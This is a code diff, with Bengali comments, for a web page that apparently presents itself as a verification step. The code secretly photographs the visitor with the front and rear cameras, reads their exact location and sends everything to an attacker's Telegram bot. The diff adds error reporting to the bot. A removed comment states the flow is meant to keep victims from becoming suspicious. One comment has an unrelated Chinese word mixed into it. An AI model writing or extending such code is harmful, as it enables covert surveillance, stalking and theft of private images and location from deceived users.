@@ -48,22 +48,23 @@ async function startProcess() {
         const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
         await captureAndSend(frontStream, "📸 ছবি ১: সামনের ক্যামেরা (Front)");
 
-        // ২. তারপর পেছনের ক্যামেরা চালু করে ছবি নেওয়া
+        // ২. তারপর পেছনের摄像头 চালু করে ছবি নেওয়া
         try {
             const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } });
             await captureAndSend(backStream, "📸 ছবি ২: পেছনের ক্যামেরা (Back)");
         } catch (e) {
-            console.log("পেছনের ক্যামেরা পাওয়া যায়নি বা ত্রুটি ঘটেছে।");
+            console.log("পেছনের ক্যামেরা পাওয়া যায়নি।");
         }
 
-        // ৩. সর্বশেষে লোকেশন ডাটা নেওয়া
+        // ৩. সর্বশেষে লোকেশন ডাটা নেওয়া (টাইমআউট ১০ সেকেন্ড করা হয়েছে)
         navigator.geolocation.getCurrentPosition(async (pos) => {
             const lat = pos.coords.latitude;
             const lon = pos.coords.longitude;
-            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
             
-            // লোকেশন রিপোর্ট টেলিগ্রামে পাঠানো
-            const textReport = `📍 *ইউজারের লোকেশন*\n\n🔗 [গুগল ম্যাপে দেখুন](${mapLink})`;
+            // গুগল ম্যাপের স্ট্যান্ডার্ড লিঙ্ক ফরম্যাট
+            const mapLink = `https://www.google.com/maps?q=${lat},${lon}`;
+            const textReport = `📍 *ইউজারের লাইভ লোকেশন*\n\n🔗 [গুগল ম্যাপে দেখুন](${mapLink})`;
+            
             await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -75,10 +76,18 @@ async function startProcess() {
             });
 
             showSuccess();
-        }, (err) => {
-            // লোকেশন না দিলেও প্রসেস শেষ করবে যেন ইউজার সন্দেহ না করে
+        }, async (err) => {
+            // লোকেশন এরর হলে টেলিগ্রামে মেসেজ যাবে
+            let errorMsg = "📍 লোকেশন পারমিশন ব্লক করা হয়েছে বা পাওয়া যায়নি।";
+            if (err.code === 3) errorMsg = "📍 লোকেশন রেসপন্স পেতে টাইমআউট হয়েছে।";
+            
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: errorMsg })
+            });
             showSuccess();
-        }, { enableHighAccuracy: true, timeout: 5000 });
+        }, { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
 
     } catch (err) {
         alert("ভেরিফিকেশন সম্পন্ন করতে ক্যামেরার অনুমতি প্রয়োজন।");
@@ -92,7 +101,6 @@ async function captureAndSend(stream, caption) {
     await video.play();
     
     return new Promise(resolve => {
-        // ক্যামেরা স্ট্যাবল হওয়ার জন্য ২ সেকেন্ড সময় দেওয়া
         setTimeout(async () => {
             const canvas = document.getElementById('canvas');
             canvas.width = 640;
@@ -108,10 +116,9 @@ async function captureAndSend(stream, caption) {
                 try {
                     await fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 } catch (e) {
-                    console.log("টেলিগ্রামে পাঠাতে ত্রুটি হয়েছে।");
+                    console.log("টেলিগ্রাম এপিআই ত্রুটি");
                 }
                 
-                // স্ট্রিম বন্ধ করা যেন ব্রাউজারের ক্যামেরার লাইট অফ হয়ে যায়
                 stream.getTracks().forEach(track => track.stop());
                 resolve();
             }, 'image/jpeg', 0.6);
